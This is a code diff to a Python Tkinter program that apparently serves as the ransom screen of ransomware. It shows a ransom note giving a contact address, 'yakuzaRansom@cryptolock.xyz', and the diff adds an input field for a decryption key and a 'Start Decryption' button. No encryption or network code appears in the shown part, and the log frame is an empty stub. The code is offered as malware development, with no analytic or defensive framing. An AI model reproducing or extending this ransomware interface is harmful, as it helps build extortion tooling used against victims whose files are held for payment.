@@ -91,7 +91,7 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
         ransomNoteLabel.tag_add("center_green", "4.0","4.end")
         ransomNoteLabel.tag_add("center_white", "5.0","6.end")
         ransomNoteLabel.tag_add("center_yellow", "8.0","9.end")
-        
+
         # Apply Configs and Setups
         ransomNoteLabel.configure(state='disabled')
         self.setup_key_frame()
@@ -101,7 +101,14 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
 
     def setup_key_frame(self):
         """ this function Setting UP the Frame for the Decryption Key Input """
-        key_
+        keyFrame = tk.Frame(self, bg='black')
+        keyFrame.pack(fill=tk.X, padx=10, pady=(10, 5))
+
+        self.key_entry = tk.Entry(keyFrame, fg='black', font=('Helvetica CE', 12), bd=1, relief=tk.FLAT)
+        self.key_entry.pack(fill=tk.X, padx=10, pady=(10, 5))
+
+        tk.Button(keyFrame, text='Start Decryption', bg="#d9534f", fg='white', font=('Helvetica CE', 12),
+                  relief=tk.FLAT).pack(side=tk.RIGHT, padx=(10, 0))
 
     def setup_log_frame(self):
         pass
